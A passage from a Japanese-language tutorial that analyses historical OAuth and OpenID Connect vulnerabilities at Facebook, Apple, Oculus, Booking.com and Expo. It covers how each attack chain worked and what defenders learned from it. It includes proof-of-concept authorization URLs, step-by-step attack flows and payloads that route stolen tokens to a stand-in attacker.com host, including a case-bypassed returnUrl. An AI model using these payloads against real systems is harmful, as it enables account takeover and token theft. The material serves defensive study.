- `response_type`・`redirect_uri`・`scope` をクライアントごとに事前登録し、リクエストパラメータでの上書きを許さず固定運用する
- `state` パラメータの必須化
- Facebookの `signed_request` に類する、署名済み・暗号化されたリクエスト機構の採用
- トークンの寿命を短くすることよりも、「そのトークンが誰向けに発行されたか」という発行元情報の検証を重視する

これらの提案の多くは、後にOpenID Connect（`id_token`の署名検証、`aud`クレーム）やPKCE（RFC 7636）、OAuth 2.0 Security Best Current Practice（RFC 9700、redirect_uri厳密一致・state必須化・Authorization Code横取り対策など）という形で、業界標準に取り込まれていくことになる。つまりHomakovの2013年の指摘は、その後10年ほどかけてOAuth2エコシステムが辿った「仕様の硬直化（実装依存を減らす方向への収束)」の予告編だったとも言える。

> 出典: Egor Homakov「OAuth1, OAuth2, OAuth...?」 — http://homakov.blogspot.com/2013/03/oauth1-oauth2-oauth.html

### 3-B-3. Facebook OAuth2 × Chromeバグ連携攻撃（2013年2月）

#### 概要：3つの独立した弱点を1本の攻撃チェーンに束ねる

この記事は、単体では致命的とは言えない3つの弱点——(1) 当時のChromeのXSS Auditor（Chromeに組み込まれていた反射型XSS検出・ブロック機構、後年廃止）の情報漏洩挙動、(2) Facebook OAuth2実装における `redirect_uri` と `response_type` の検証不備、(3) Facebook側のURLフラグメント処理の癖——を鎖のようにつなげることで、**任意のFacebookアプリに対するアクセストークン・認可コード・signed_requestの窃取**を実現した、複合的な脆弱性チェーンの実例である。単一の脆弱性の危険度は「low」評価でも、組み合わせることで実害あるエクスプロイトになるという、脆弱性連鎖(vulnerability chaining)の教科書的な事例と言える。

なお、これは2013年当時のChrome XSS Auditor（現在は全ブラウザで廃止済み。ChromeもXSS Auditorを2019年前後に撤廃している）とFacebook OAuth2実装の組み合わせに固有の事例であり、現在のブラウザやFacebookの実装には該当しない、完全に歴史的な事例であることに留意してほしい。

#### 弱点1: Chrome XSS Auditor の参照元(Referrer)情報漏洩

当時のChromeには、レスポンスヘッダー `X-XSS-Protection: 1; mode=block` が指定されたページで、パラメータ内に反射型XSSと疑われるスクリプトを検出すると、そのページの読み込みをブロックし、ブラウザは（当時の実装で）そのページの読み込みを中断して事実上の空白ページ（about:blank相当の状態）に遷移する、という挙動があった。この遷移後も、JavaScript経由で `document.referrer` を参照すると、**ブロックされる直前に読み込もうとしていたページのURL**が取得できてしまう。

つまりこの挙動は、「XSSを未然に防ぐ」という本来の目的とは裏腹に、「攻撃者が用意したURL（クエリパラメータにセンシティブな情報を含むもの）をXSS Auditorに検出させてブロックさせることで、そのURL自体の中身をJavaScriptから読み取れてしまう」というサイドチャネルとして悪用可能だった。

#### 弱点2: Facebook OAuth2 の response_type / redirect_uri 検証不備

前述のとおり、`response_type` パラメータはURLの一部として送信者側が自由に指定できる。この事例では以下のようなパラメータの組み合わせが使われた。

```
response_type=token,signed_request
```

これは「アクセストークンとsigned_request（Facebookアプリ向けの署名済みペイロード。ユーザーIDやアプリの状態情報を含む）の両方をフラグメントに含めて返す」ことを要求するものだ。加えて `redirect_uri` について、当時のFacebook実装では**facebook.comドメイン内の任意のパスを指定可能**という緩さがあった。これにより、攻撃者は「見た目はFacebookドメイン内のURLだが、実際には攻撃者が用意した挙動を誘発するパス」を `redirect_uri` として登録なしに使うことができた。

#### 弱点3: Facebookのフラグメント処理とstateパラメータへのペイロード注入

実際のPoC URLは次のような形になる。

```
http://www.facebook.com/dialog/oauth?client_id=[対象アプリのID]
&response_type=token,signed_request
&redirect_uri=http%3A%2F%2Ffacebook.com%2F%23%2521%2Fconnect%2Fxd_arbiter
&state=[XSSペイロード]&sdk=joey
```

ここでのポイントは2つある。

1. `redirect_uri` の中に `%23%2521`（URLエンコードされた `#!`）を仕込んでいる。Facebookの一部ページ実装は、URL中に含まれる `#!`（当時のAjaxクローリング対応でよく使われた記法。`_escaped_fragment_` と対になるパターン）を検出すると、JavaScript側で `#` を取り除いて内容をクエリ文字列相当に変換して再解釈する、という挙動を持っていた。この挙動を利用して、本来はURLフラグメント（サーバーに送信されない部分）に格納されるはずのアクセストークンを、**JavaScriptの処理を経由してリンク遷移やreferrer送出の対象になり得る形に変換**させる。
2. `state` パラメータに、Chrome XSS Auditorに検出させるための攻撃用スクリプト文字列（記事中では `bigPipe` のような、Facebook内部で実際に使われる変数名を模したペイロード）を注入する。この `state` はサーバー側で厳密なホワイトリスト検証がされていなかったため、リフレクトされたパラメータとしてページに反映され、Auditorに「反射型XSSの疑いがある」と誤検知(あるいは意図通りに検知)させることができた。

#### 攻撃フロー全体の統合

1. 攻撃者は、ユーザーが過去に認可済みの人気アプリ（対象は100〜200個規模で一括処理されたと記述されている）のclient_idを使い、上記のパラメータを組み合わせた悪意あるOAuth認可URLを大量に生成する。
2. これらのURLを複数のウィンドウ（記事では最大25個程度）で同時に開かせる。
3. ユーザーがすでにそのアプリを認可済みであれば、確認画面をスキップして即座にリダイレクトが発生し、アクセストークンとsigned_requestが `redirect_uri` のフラグメントに載って返ってくる。
4. `state` に仕込まれたスクリプトがChromeのXSS Auditorに検出され、ページ読み込みがブロックされてabout:blank相当の状態に遷移する。
5. 攻撃者が用意した親ウィンドウ側のJavaScriptが、子ウィンドウの `document.referrer` を読み取る。ブロック直前のURL（=アクセストークンやsigned_requestを含むURL）がここに残っている。
6. 抽出したトークンを使って対象アプリのAPIを呼び出し、被害者になりすます。

#### なぜこれが成立したのか（原理のまとめ）

この攻撃チェーンの本質は、**「本来はサーバーに送信されないはずのURLフラグメント情報が、ブラウザ側の複数の実装挙動（XSS Auditorのフォールバック遷移、`document.referrer`の仕様、Facebook独自のフラグメント書き換えロジック）を経由することで、間接的に読み取り可能な状態に変換されてしまう」**という点にある。個々の挙動は「仕様通り」あるいは「意図された機能」であっても、組み合わせるとフラグメントの機密性という前提が崩れる。これはOAuth2のImplicit Flowが「アクセストークンをURLフラグメントに載せて、サーバーに送信させずクライアントサイドJSのみで受け取る」という設計に依拠していたことの構造的な脆さを示す好例であり、後にImplicit Flowそのものが非推奨化される(OAuth 2.0 Security BCPで新規実装には認可コードフロー+PKCEが推奨される)大きな理由の一つとなった。

#### 影響とその後の対応

記事によれば、この手法で任意のclient_idに対するaccess_token・code・signed_requestが取得可能であり、実際に人気アプリ100〜200個規模を対象にトークンを一括収集できる状態だったとされる。

Facebook側の対応:
- `X-XSS-Protection` ヘッダーの値を `0`（Auditor無効化）に変更
- `redirect_uri` を facebook.com ドメイン内の任意パスに設定できる緩さを制限
- `%23`（`#`のエンコード）に関連する処理を修正

Chrome側は、この挙動自体を独立した脆弱性としては「重大度：低」と評価し、単体でのバウンティ支給は見送られたが、Facebookからは複合的な影響を踏まえて5,000ドルの報奨金が支払われている。

> 出典: Egor Homakov「How we hacked Facebook with OAuth2 and Chrome bugs」 — http://homakov.blogspot.com/2013/02/hacking-facebook-with-oauth2-and-chrome.html

### まとめ：Homakovの古典研究が今日に残す教訓

3本の記事を通じて共通して浮かび上がるのは、次の3つの設計原則である。

1. **クライアントの申告（`response_type`・`redirect_uri`・`scope`など）を信頼せず、認可サーバー側で事前登録済みの値と厳密照合する。** リクエストパラメータでの上書きを許す設計は、それ自体が攻撃対象になる。
2. **トークンや認可コードには、それがどのクライアント向けに発行されたかという文脈情報を必ず紐づけ、受け取り側もそれを検証する。** 「トークンさえあれば認証できる」という単純化は、トークンの転用・置き換え攻撃を招く。
3. **URLフラグメントやリダイレクトチェーンといった「サーバーに送信されないはずの経路」も、ブラウザ実装の癖次第で漏洩し得る、という前提でシステムを設計する。** Implicit Flowの構造的な弱さは、この前提の甘さそのものに起因していた。

これらは特定の年代のFacebookやChromeに固有の欠陥ではなく、OAuth2を実装・診断する際に今なお有効なチェック観点である。バグバウンティでOAuth関連の対象を調査する際は、この3記事が示した「redirect_uri検証」「response_type固定」「トークン発行元検証」「フラグメント漏洩経路」という4つの切り口を、まず基本チェックリストとして当てはめてみるとよい。

## id_token 検証不備とファーストパーティ access_token 漏洩の事例

本節では、OAuth/OIDC(OpenID Connect)の実装不備が実際にどのような形でアカウント乗っ取り(Account Takeover, ATO)につながったかを、2つの著名なバグバウンティ事例から学ぶ。1つ目は「Sign in with Apple」の `id_token` 検証不備、2つ目は Facebook/Oculus における `response_type=token` とオープンリダイレクトの組み合わせによる、ファーストパーティ(サービス提供者自身が発行した) `access_token` の窃取である。どちらも「認可サーバー側の実装の隙」を突いたものであり、クライアント側の実装だけを気にしていては見逃しやすい種類の脆弱性である。

### 前提知識の整理: id_token と access_token の違い

まず両者の役割を整理する。OAuth 2.0 の `access_token` は「リソースへのアクセス権を表すチケット」であり、中身の形式は仕様上規定されていない(不透明な文字列でもよい)。一方、OpenID Connect(OIDC)の `id_token` は「誰が認証されたか」を表明するための JWT(JSON Web Token、ヘッダー・ペイロード・署名の3パートを `.` で連結し Base64URL エンコードした文字列)であり、`iss`(発行者)、`sub`(認証された本人を一意に表す識別子)、`aud`(想定される受け取り手のクライアントID)、`exp`(有効期限)、そして必要に応じて `email` などのクレーム(JWT内の主張情報)を含む。

`id_token` を受け取ったクライアント(Relying Party、以下 RP)は、次の検証を **必ず** 行わなければならない(OIDC Core仕様 3.1.3.7節が要求する最低限のチェックである)。

1. 署名検証: 発行者が公開しているJWKS(JSON Web Key Set、公開鍵の集合)を使い、JWTの署名がその発行者の秘密鍵で作られたものであることを確認する。
2. `iss` が期待する認可サーバーのURLと一致するか。
3. `aud` が自分自身のクライアントIDと一致するか(他のアプリ宛に発行されたトークンを使い回されていないか)。
4. `exp` が過ぎていないか、`nonce`(リプレイ攻撃を防ぐためにRPが発行時に指定するランダム値)が自分が発行したものと一致するか。

ここで重要なのは、**署名が正しく検証できることと、そのクレームの内容(特に `email`)が「本人が所有・管理しているものである」ことは別問題**だという点である。Apple の事例はまさにこの区別が崩れたケースである。

### 事例1: Sign in with Apple の id_token 検証不備(Bhavuk Jain, 2020)

#### 発見の経緯と脆弱性の核心

2020年4月、研究者 Bhavuk Jain は「Sign in with Apple」の実装を調査し、Apple の認証エンドポイントに対して**任意のメールアドレスを指定したリクエストを送るだけで、Appleの正規の秘密鍵で署名された、有効な `id_token` が発行される**ことを発見した。本人の言葉を引用する。

> "I could request JWTs for any Email ID from Apple and when the signature of these tokens was verified using Apple's public key, they showed as valid."

これは、Appleのトークン発行エンドポイントが、リクエストしてきたクライアントが「本当にそのメールアドレスの持ち主として認証されたユーザーの代理であるか」を紐付けて検証しておらず、リクエストパラメータに含まれるメールアドレスをそのまま信用して `id_token` の `email` クレームに埋め込み、正規の鍵で署名して返してしまっていた、という設計・実装上の欠陥である。

#### なぜ「署名が正しい」のに偽造が成立するのか(仕組みレベルの説明)

ここが本事例の核心であり、読者が誤解しやすい点でもある。JWTの署名検証は「このJWTの中身をApple(発行者)が作ったこと」を保証するに過ぎない。**中身に何を書くかはApple自身の実装ロジック次第**であり、そのロジックが「リクエストされた `email` パラメータを、認可コード発行の元になった実際のログインセッションのユーザーと突き合わせて検証する」処理を欠いていれば、攻撃者は正規の署名鍵を盗む必要すら無く、「Appleに頼んで、好きなメールアドレスの入った有効な `id_token` を作ってもらう」ことができてしまう。

通常のOAuth/OIDCの「認可コードフロー」では、以下の順序が期待される。

1. ユーザーがブラウザ経由でApple IDのパスワード/生体認証によってApple自身に対して認証する。
2. Appleはそのユーザーのセッション(=どのApple IDでログインしたか)に紐づけて認可コードを発行する。
3. RP(クライアントアプリのバックエンド)がその認可コードをApple の `/auth/token` エンドポイントに投げ、認可コードと1:1で紐づいた `id_token` (ステップ1で認証された、まさにそのユーザーの `email`/`sub` を含む)を受け取る。

Jainが指摘した欠陥は、この「認可コードとユーザーの紐付け」あるいは「トークン発行時のクレーム生成ロジック」のいずれかで、**リクエスト側が自由に指定できるメールアドレス値がそのまま信用されてしまうパス**が存在したことにある。攻撃者は正規のOAuthフローを一度自分のメールアドレスで通した上で、フォージした(偽装した)POSTリクエストに被害者のメールアドレスを指定することで、被害者本人としての `id_token` を手に入れられた。攻撃に必要なのは被害者のメールアドレスを知っていることだけであり、パスワードや二要素認証は一切不要だった。

#### 影響範囲

「Sign in with Apple」をログイン手段として組み込んでいた、Dropbox、Spotify、Airbnb、Giphyなどのサードパーティサービスに影響が及ぶ可能性があった。特に「Appleが発行するメールアドレスの真正性を全面的に信頼し、追加の検証(例えばメールアドレスへの確認メール送付など)を行わずにアカウントを作成・ログインさせる」実装をしていたRPほど、被害が深刻(そのままアカウント乗っ取り)になりうる。ただしApple自身の調査では、実際の悪用の痕跡は確認されなかったとされている。

#### 報奨と対応

Appleはこの報告に対しApple Security Bounty プログラムを通じて**10万ドル(100,000ドル)**を支払った。Apple側で修正が完了するまで研究者は公表を控え、いわゆる責任ある開示(Responsible Disclosure、脆弱性をベンダーに通知し修正後に公表する慣行)の手順を踏んでいる。

#### 防御側の学び

- **OIDCの `id_token` を受け入れるRPは、`email` クレームだけでなく `sub`(発行者内で不変な一意識別子)をアカウントの紐付けキーとして使うべきである。** メールアドレスは変更されうる上、今回のように発行プロセス側の欠陥で偽装される可能性がある。
- 認可サーバーを実装する側は、**トークン発行ロジックにおいて「リクエストパラメータの値」と「実際に認証されたセッションの属性」を必ず突き合わせ、後者を正としてクレームを生成する**必要がある。クライアントが指定した値をそのままクレームに反映する設計は、たとえ最終的な署名が正規の鍵で行われていても、事実上「なりすまし放題」の穴になる。
- RP側の追加防御として、初回ログイン時にメールアドレス宛の確認(verification)を要求する、あるいは同一メールアドレスに対する複数の認証プロバイダの紐付けを慎重に扱う、といった多層防御が有効である。

> 出典: Bhavuk Jain「Zero-day in Sign in with Apple」— https://bhavukjain.com/blog/2020/05/30/zeroday-signin-with-apple/

### 事例2: Facebook/Oculus におけるファーストパーティ access_token 窃取(Youssef Sammouda, 2023)

#### 背景: なぜ「ファーストパーティ」の access_token が問題になるのか

サードパーティアプリへの `access_token` 漏洩がよく語られる一方、本事例は**Meta自身(Facebook)が発行した、Meta自身のサービス(Oculus)向けの `access_token`** が漏洩するという「ファーストパーティ間」の事例である点が特徴的である。OculusはかつてFacebookアカウントでログインする仕組みを持っており、その連携のために `auth.oculus.com/login/` がFacebookのOAuthクライアントとして登録された正規の `redirect_uri`(認可レスポンスの送付先URL)になっていた。

#### response_type=token と暗黙的フローの危険性

OAuth 2.0 には認可コードフロー(`response_type=code`)と暗黙的フロー(Implicit Flow、`response_type=token`)がある。暗黙的フローでは、認可サーバーが `access_token` を**URLのフラグメント(`#` 以降の部分)に直接埋め込んでリダイレクトする**。フラグメントはサーバーには送信されずブラウザ内にとどまる設計だが、その代わり、**ブラウザがそのページから別のURLへ遷移する際に、遷移先のJavaScriptがフラグメントを読み取れてしまったり、リダイレクトチェーンの途中に挟まった別のオリジンに漏れてしまったりするリスク**を常に抱える。これが、現在のOAuth 2.0セキュリティベストプラクティス(RFC 8252 / OAuth 2.0 Security Best Current Practice)が暗黙的フローの利用を非推奨としている理由である。

Sammoudaが発見した攻撃チェーンは、次のPoC URLに要約される。

```
facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&response_type=token
```

これを分解すると、次のような入れ子構造になっている。

- 外側: Facebookの認可エンドポイントに対し `response_type=token` を指定し、`redirect_uri` として `auth.oculus.com/login/` (Facebook OAuthクライアント設定上、正規に登録済みのredirect_uri)を指定している。
- 内側: その `auth.oculus.com/login/` へのクエリパラメータとして、**さらに別の `redirect_uri` パラメータ**(`https://forums.oculus.com/openredirect`)を忍ばせている。

#### なぜこれで漏洩が成立するのか(仕組みレベルの説明)

1. Facebookは `redirect_uri=auth.oculus.com/login/?redirect_uri=...` 全体を、事前登録された `auth.oculus.com/login/` と前方一致(あるいは登録値と完全一致)するとみなし、正規のredirect_uriとして受理する。これはOAuthの `redirect_uri` 検証において、**クエリ文字列部分まで含めて厳密に一致させていなかった**ことを意味する。
2. `response_type=token` のため、FacebookはOculusのアカウントに紐づく **access_token をURLフラグメントに付与した状態で** `auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect#access_token=TOKEN` へリダイレクトする。
3. 本来、`auth.oculus.com/login/` 側のページは、受け取った `access_token` を(URLのままではなく)JavaScriptでいったん読み取り、外部に見えない形で後続処理(サーバーへの送信など)に使うことが期待されていた。実際、Oculusは以前、この「フラグメント内のトークンをJavaScript経由でのみ扱い、さらなる外部への直接リダイレクトを行わない」という防御策を取っていたと記事は指摘している。
4. しかし、Oculusのログイン基盤が「Meta Accounts」に移行された際に、この保護のためのJavaScript処理が失われ、**`auth.oculus.com/login/` がクエリパラメータ内の `redirect_uri`(=攻撃者が仕込んだ `forums.oculus.com/openredirect`)へ、フラグメントを保持したまま素直にリダイレクトしてしまう**挙動に変わっていた。フラグメントは通常のHTTPリダイレクト(3xxレスポンスの`Location`ヘッダー)では基本的に保持される(ブラウザの仕様上、リダイレクト先URLに新たなフラグメントが指定されていない限り、遷移前のフラグメントが引き継がれる)ため、`access_token` はそのまま `forums.oculus.com` 側に渡ってしまう。
5. `forums.oculus.com/openredirect` 自体がオープンリダイレクト(遷移先を外部から指定できてしまう脆弱なリダイレクタ)であったため、最終的に **攻撃者が完全に制御するドメインまで `access_token` を持ち出す**ことができた。攻撃者はそのトークンをFacebook/Oculusの API に対して使うことで、被害者のアカウントを乗っ取れる。

この一連の流れは、「(a) redirect_uriの検証がクエリ文字列やネストされたパラメータまで厳密でない」「(b) response_type=tokenによりトークンがURL上に露出する」「(c) 中継地点にオープンリダイレクトが存在する」という**3つの弱点が直列に連鎖して初めて致命傷になる**典型例であり、単体では「軽微」と判断されがちな要素が組み合わさることの危険性を示している。

#### 攻撃の前提条件と影響

この攻撃を成立させるには、被害者が攻撃者の用意した悪意あるリンクをクリックする必要がある(被害者が既にFacebookにログイン済みであれば、そのセッションを使ってOAuth同意画面が自動的に進む、あるいは同意済みであればリダイレクトが即座に発生する)。成功すると攻撃者はFacebook/Oculusの正規のファーストパーティ `access_token` を入手し、被害者になりすましてAPIを呼び出せるため、影響はアカウントの完全な乗っ取りに達する。

#### 報奨と時系列

- 2022年8月27日: Metaへ報告
- 2022年9月25日: Metaが確認・修正・報奨授与
- 報奨額: **44,250ドル**(BountyConボーナスおよび「最高影響度レポート」ボーナスを含む)

#### 防御側の学び

- **`redirect_uri` の検証は文字列の前方一致や部分一致ではなく、完全一致(スキーム・ホスト・パス・クエリ文字列まで)で行うべきである。** クエリパラメータの中に別の `redirect_uri` を埋め込めてしまう設計は、検証ロジックの想定外の入り口を作る。
- **可能な限り `response_type=token`(暗黙的フロー)を廃止し、認可コードフロー + PKCE(Proof Key for Code Exchange、認可コード横取り攻撃を防ぐための追加検証の仕組み)へ移行する。** 認可コードフローであればトークン自体はバックエンド間の直接通信(フロントチャネルのリダイレクトではなく)でしか渡らないため、フラグメント経由の漏洩という攻撃面そのものが消える。
- **社内のマイクロサービス間・自社サービス間(ファーストパーティ)連携であっても、外部の攻撃者が介在できるリダイレクトチェーンが1つでも存在すれば、サードパーティ連携と同等のOAuthセキュリティ設計が要求される。** 「自社のサービス同士だから安全」という前提は誤りである。
- 自社ドメイン内のオープンリダイレクトは、それ単体では「情報漏洩なし」に見えても、OAuthのトークン運搬経路に組み込まれた瞬間に重大な脆弱性の踏み台となる。オープンリダイレクトの排除は、OAuthを利用するサービスにおいて優先度の高い防御策である。

> 出典: Youssef Sammouda「Account takeover of Facebook/Oculus accounts due to First-Party access_token stealing」— https://ysamm.com/2023/01/29/account-takeover-of-facebook-oculus-accounts-due-to-first-party-access_token-stealing.html

### 2つの事例に共通する教訓

両事例は攻撃手法としては全く異なる(片方は認可サーバーのトークン発行ロジックの欠陥、もう片方はredirect_uri検証とトークン運搬経路の欠陥)が、共通するのは**「OAuth/OIDCのプロトコル上は正しく見える一手一手が、発行者側の実装の細部(クレーム生成ロジック、文字列比較の厳密さ、リダイレクト時のフラグメント保持)によって、想定外の意味を持ってしまう」**という点である。防御側は、以下を実装・監査チェックリストとして持つとよい。

- `id_token` の `email` などのクレームは、認可サーバーが「実際に認証されたユーザー」の属性から生成しているか(クライアント指定値をそのまま反映していないか)を、可能であれば発行者側の実装ドキュメントやセキュリティアドバイザリで確認する。
- 自社が認可サーバーを実装する場合、RPから受け取るあらゆるパラメータ(特に `redirect_uri`)を**完全一致**で検証し、部分一致・前方一致・正規表現の甘さを排除する。
- 新規実装では`response_type=token`の暗黙的フローを採用せず、認可コードフロー+PKCEを標準とする。
- レガシーな保護策(JavaScriptによるフラグメント処理など)に依存している箇所は、周辺システムの改修(今回で言えばMeta Accountsへの移行)によって暗黙のうちに失われることがあるため、セキュリティ上重要な防御策は明示的にドキュメント化し、リグレッションテストの対象に含める。

本節で扱った内容はいずれも、報告者が責任ある開示の手順に従いベンダーへ通知し、修正確認後に技術詳細を公開したものである。読者が自身の学習・防御目的の検証を行う場合も、実在サービスや本番環境に対する無許可の検証は行わず、必ず自身が管理するテスト環境やバグバウンティプログラムが許可する範囲内で行うこと。

## Salt Labs の社会ログイン研究（access token 未検証の3部作）

このセクションでは、API セキュリティ企業 Salt Security の研究部門 **Salt Labs** が 2022〜2023 年にかけて公開した、ソーシャルログイン（「Facebook でログイン」「Google でログイン」といった、外部 ID プロバイダを使ったログイン機能）にまつわる OAuth 脆弱性の連続研究を扱う。3 本の記事は、いずれも「大手サービスがユーザー認証を外部の OAuth プロバイダに委任したときに、委任先から受け取った資格情報を**十分に検証していない**」という共通の失敗パターンを、異なる角度から突いている。

3 部作を貫くキーワードは次の 3 つである。

- **redirect_uri の検証不備**（第1弾 Booking.com）: トークンやコードの「返送先」を攻撃者が横取りできる。
- **返送先パラメータ（returnUrl）の早すぎる信頼**（第2弾 Expo）: 中継サービスが、ユーザー確認前に攻撃者指定の返送先を記憶してしまう。
- **access token の受信側検証欠如（token audience の未確認）**（第3弾 Grammarly/Vidio/Bukalapak）: 別アプリ向けに発行されたトークンを、そのまま自分のユーザーとして受け入れてしまう。

以下、防御の観点から、各記事の仕組みと根本原因を順に解説する。なお本セクションは既に修正済みの過去事例の解説であり、実在サービスや本番環境への無許可の検証手順を提供するものではない。

---

### 第1弾: Traveling with OAuth – Account Takeover on Booking.com（2023年3月）

#### 背景となる正常フロー

Booking.com は「Login with Facebook」に **認可コードグラント（Authorization Code Grant）** を採用していた。認可コードグラントとは、まずブラウザ経由で短命の「認可コード（code）」を受け取り、次にサーバー同士のバックチャネル通信で、そのコードとアプリの秘密鍵（app-secret）を引き換えに access token を取得する、OAuth の中でも比較的安全とされる方式である。

正常時の流れは次のとおり。

```
1. ユーザーが「Login with Facebook」をクリック
2. Booking が Facebook にリダイレクト:
   https://www.facebook.com/v3.0/dialog/oauth
     ?redirect_uri=https://account.booking.com/social/result/facebook
     &client_id=210068525731476
     &response_type=code
     &state=[値]
3. Facebook が認証後、code を付けて返送:
   https://account.booking.com/social/result/facebook?code={code}&state=[値]
4. Booking のバックエンドが app-secret を使い code を token に交換
5. Booking が Graph API でユーザーの email を取得
```

ここで `redirect_uri`（認可の結果を返す先の URL）と `state`（CSRF 対策と状態保持のためにアプリが自由に詰められる値）が攻撃の鍵になる。

#### 3 つの欠陥の連鎖

Salt Labs は、単独では致命的でない 3 つの欠陥を連鎖させて、アカウント乗っ取り（Account Takeover, ATO）を成立させた。

**欠陥1: redirect_uri のパス検証不足**
Facebook 側の設定は、`redirect_uri` の**オリジン**（`account.booking.com`）しか検証しておらず、**パス部分**は任意でよかった。つまり `https://account.booking.com/任意/攻撃者の/パス` のような URL でも Facebook がコード／トークンを返送してしまう。

> なぜそうなるか: OAuth の `redirect_uri` は本来「登録済みの正確な URL と完全一致」で検証すべきだが、多くのプロバイダは運用上の柔軟さのために「登録ドメイン配下ならパスは自由」というゆるい照合（プレフィックス／ドメイン一致）を許すオプションを持つ。この緩和が、後段の open redirect と結合した瞬間に致命傷になる。

**欠陥2: state 経由のオープンリダイレクト**
Booking の `/oauth2/authorize` エンドポイントは、`state` パラメータに **base64 エンコードされた JSON** を受け付けていた。その JSON には `mysettings_path` フィールドがあり、これが遷移先を決めていた。

```
state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ
```

これを base64 デコードすると：

```json
{"mysettings_path":"https://attacker.com/index.php","aid":"123"}
```

`mysettings_path` に攻撃者ドメインを入れると、ユーザーがそこへ遷移させられる。これが典型的な **オープンリダイレクト（サイトが任意の外部 URL へ無条件に転送してしまう欠陥）** である。

> なぜそうなるか: `state` は「アプリが自由に使ってよい不透明な値」であり、OAuth プロバイダは中身を検証しない。開発者がその中に「遷移先 URL」を入れ、しかも受信側でホワイトリスト検証せずに転送に使うと、`state` がそのままオープンリダイレクトの運び手になる。

**欠陥3: モバイルアプリのユーザー制御 redirect_uri**
モバイルアプリは `resultUri` というパラメータを受け取り、バックエンドの **トークン交換リクエスト**の `redirect_uri` として、ハードコードされた値の代わりに使っていた。Facebook はコードを token に交換する際、交換時の `redirect_uri` が認可時と一致するか照合するが、攻撃者が両方を自分の値に揃えられるため、この照合をすり抜けられた。

#### 攻撃の組み立て

3 つを連鎖させると次のようになる（要点のみ、防御理解のための概念図）。

```
Step1: Facebook URL の redirect_uri に、Booking のオープンリダイレクト(/oauth2/authorize)を仕込む
  https://www.facebook.com/v3.0/dialog/oauth
    ?redirect_uri=https://account.booking.com/oauth2/authorize?state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAifQ
    &response_type=code,token
    &client_id=210068525731476

Step2: 被害者がリンクを踏むと、Facebook が code/token をハッシュフラグメントで返送
  https://account.booking.com/oauth2/authorize#code=[秘密のコード]&access_token=[トークン]

Step3: オープンリダイレクトが、フラグメントごと攻撃者ドメインへ転送
  https://attacker.com/index.php#code=[秘密のコード]&access_token=[トークン]

Step4: 攻撃者の JavaScript がフラグメントから code を拾い、自分のサーバーへ送信
Step5: 攻撃者はモバイルアプリのトークン交換リクエストを傍受し、
       code を被害者のものに、resultUri を元の攻撃 URL に差し替えて成立させる
```

> なぜフラグメント（`#` 以降）が効くのか: URL のフラグメントはブラウザがサーバーに送らずクライアント側に保持する。リダイレクトが起きても多くのブラウザは**フラグメントを次の遷移先へ引き継ぐ**ため、`#access_token=...` は攻撃者ドメインまで運ばれ、そこの JavaScript が読み取れてしまう。`response_type=code,token` と指定して token も同時に吐かせている点にも注意。

#### 影響と修正

乗っ取りが成立すると、予約履歴・個人情報の閲覧、予約のキャンセル、タクシー手配などが可能になった。さらに Booking はアカウント連携を通じて **Kayak.com** にも波及し、Google など他プロバイダで作ったアカウントにも影響した。

修正は、OAuth プロバイダ設定で redirect_uri を**完全なパスまでハードコード**すること、ユーザー入力を遷移先に使わないこと、トークン交換前にすべての OAuth パラメータをサーバー側で検証することであった。

- 開示タイムライン: 発見 2022/11/10–21、報告 11/27、技術開示 12/4、修正確認 12/26。

> 出典: Traveling with OAuth – Account Takeover on Booking.com — https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com

---

### 第2弾: A New OAuth Vulnerability Impacts Hundreds of Online Services（CVE-2023-28131, CVSS 9.6, 2023年6月）

#### 対象: Expo の AuthSession Proxy

第2弾の標的は、個別サービスではなくフレームワーク側である。**Expo**（React Native アプリを素早く作るための開発プラットフォーム）が提供していた **AuthSession Proxy サービス（`auth.expo.io`）** が対象で、ライブラリ `expo-auth-session` に紐づく。CVE-2023-28131、CVSS スコアは **9.6（Critical）** が付与された。

このプロキシは、モバイルアプリの OAuth を楽にするための中継役である。モバイルアプリは固定の HTTPS URL を持ちにくい（ディープリンクのカスタムスキームなどを使う）ため、Expo が `auth.expo.io/@アカウント/プロジェクト` という共通の `redirect_uri` をいったん受け取り、そこから各アプリのディープリンクへトークンを転送する、という設計だった。

```
1. ユーザーがソーシャルプロバイダ（Facebook/Google 等）でログイン開始
2. redirect_uri=https://auth.expo.io/@account/project でプロバイダへ
3. プロバイダが auth.expo.io にトークンを返送
4. auth.expo.io がアプリのディープリンクへトークンを転送
```

#### 根本原因: returnUrl の早すぎる信頼

致命的だったのは、Expo が **`returnUrl` パラメータ**（トークンの最終転送先を指定する値）を、**ユーザーの確認前にクッキー `ru`（Return URL）へ書き込んでいた**点である。

> なぜそうなるか: 本来この種の中継は「このアプリにトークンを渡してよいですか？」とユーザーに確認し、承認後にはじめて転送先を確定すべきである。ところが Expo は確認画面を出す**前に**、URL の `returnUrl` をそのままクッキーに保存していた。攻撃者が事前に悪意ある `returnUrl` をクッキーに焼き付けておければ、その後の正規ログインで得たトークンが攻撃者ドメインへ飛ぶ。ここは「ユーザー入力（returnUrl）を、承認という信頼境界を越える前に永続化してしまった」典型的な設計ミスである。

さらに検証は**大文字小文字の細工**（`hTTps://` のように綴りを変える）で回避できたとされ、URL 検証ロジックの脆さも露呈した。

#### 攻撃手順

```
Step1（クッキー注入）: 攻撃者が victim に returnUrl=hTTps://attacker.com を含むリンクを送る。
  Expo は確認メッセージを出す前にクッキー ru を設定してしまう。

Step2（自動化）: JavaScript がポップアップを2つ開く。
  1つ目: 悪意ある return URL をあらかじめセットするためのウィンドウ
  2つ目: 正規の Facebook OAuth フロー

Step3（トークン窃取）: victim(Dan) が2つ目のリンクをクリック:
  https://www.facebook.com/v6.0/dialog/oauth
    ?redirect_uri=https://auth.expo.io/@moreisless3/me321&client_id=328...
  Facebook が token を付けて Expo に返送 → Expo は ru の値 https://attacker.com へ token を送る

Step4（乗っ取り）: 攻撃者は盗んだ token で正規ログインを開始し、
  自分のセッショントークンを victim のものに差し替える
```

#### 影響

